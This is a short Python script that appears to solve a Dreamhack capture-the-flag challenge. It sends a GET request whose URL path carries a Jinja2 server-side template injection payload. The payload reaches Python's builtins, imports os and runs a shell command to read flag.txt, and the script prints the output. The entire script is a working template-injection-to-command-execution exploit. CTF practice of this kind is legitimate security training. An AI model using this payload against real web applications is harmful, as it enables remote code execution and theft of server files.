




import requests

HOST = "http://host3.dreamhack.games:23753/"

r = requests.get(url=HOST + "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}")

print(r.text)
